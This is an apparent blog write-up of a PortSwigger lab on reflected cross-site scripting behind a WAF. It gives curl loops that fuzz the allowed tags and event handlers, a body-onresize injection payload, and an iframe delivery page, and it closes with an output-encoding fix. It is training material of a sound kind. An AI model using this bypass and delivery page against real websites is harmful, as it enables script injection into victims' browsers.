---
layout: post
title: "PortSwigger: Reflected XSS — WAF Tag/Attribute Enumeration Bypass"
date: 2026-09-03 09:00:00 -0500
categories: [PortSwigger, XSS]
tags: [xss, reflected-xss, waf-bypass, tag-enumeration, onresize, body-tag, iframe, CWE-79]
---

## Overview

This lab demonstrates a **reflected XSS** vulnerability where a WAF blocks most
HTML tags and event-handler attributes — but the allowlist is finite and
enumerable. The intended bypass uses a `<body>` tag with `onresize`, delivered via
an exploit-server iframe that triggers a viewport resize.

**CWE:** [CWE-79 — Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

---

## The Vulnerability

The application echoes a search parameter directly into HTML context:

```html
<h1>0 search results for 'USER_INPUT'</h1>
```

Angle brackets survive un-encoded. Standard payloads like `<img src=1 onerror=print()>`
return `400 Bad Request` — a WAF is stripping most tags and attributes.

---

## The Technique: Enumerate the Allowlist

The WAF's allowlist is enumerable. Fuzzing reveals that `<body>` and `onresize` are
both allowed (return `200`), while everything else is blocked:

```bash
for tag in img svg script body iframe; do
  code=$(curl -sk "https://TARGET/?search=<${tag}>" -o /dev/null -w "%{http_code}")
  echo "${tag}: ${code}"
done
# body: 200

for evt in onresize onload onfocus onclick; do
  code=$(curl -sk "https://TARGET/?search=<body+${evt}=print()>" -o /dev/null -w "%{http_code}")
  echo "${evt}: ${code}"
done
# onresize: 200
```

---

## Why `<body onresize>` Works

HTML5 defines special behaviour for a second `<body>` start tag: rather than
creating a new element, the parser **merges** its attributes into the existing body
element. Injecting `"><body onresize=print()>` therefore adds `onresize=print()` to
the live body — and `onresize` on body maps to `window.onresize`.

The handler fires whenever the viewport is resized.

---

## The Exploit

A page hosted on the exploit server loads the vulnerable URL inside an iframe and
triggers a resize with `onload`:

```html
<html><body>
<iframe id="t"
  src="https://TARGET/?search=%22%3E%3Cbody%20onresize%3Dprint()%3E">
</iframe>
<script>
  document.getElementById("t").onload = function() {
    this.style.width = "100px";
  };
</script>
</body></html>
```

**Execution chain:**
1. Victim loads the exploit server page
2. The iframe loads the target with the injected `<body onresize=print()>`
3. `onload` fires → iframe width shrinks from default (300 px) to 100 px
4. Inner viewport resize fires `window.onresize` → `print()` is called
5. Lab solved

---

## The Fix

WAF allowlists are not a substitute for output encoding. The correct fix is
context-aware encoding at the reflection point:

```python
# Vulnerable
return f"<h1>0 search results for '{query}'</h1>"

# Fixed
from markupsafe import escape
return f"<h1>0 search results for '{escape(query)}'</h1>"
```

Encoding `<`, `>`, `"`, `'`, and `&` at the output layer makes the tag-enumeration
attack impossible regardless of what the WAF allows.

---

## Key Takeaways

- WAF allowlist filtering is always enumerable — the goal is to find what *is* permitted.
- HTML5 second-body attribute merge is a reliable primitive: `<body>` allowed + any window event handler allowed = XSS.
- `onresize` + iframe resize is the canonical delivery pattern for WAF-blocked-tag labs.
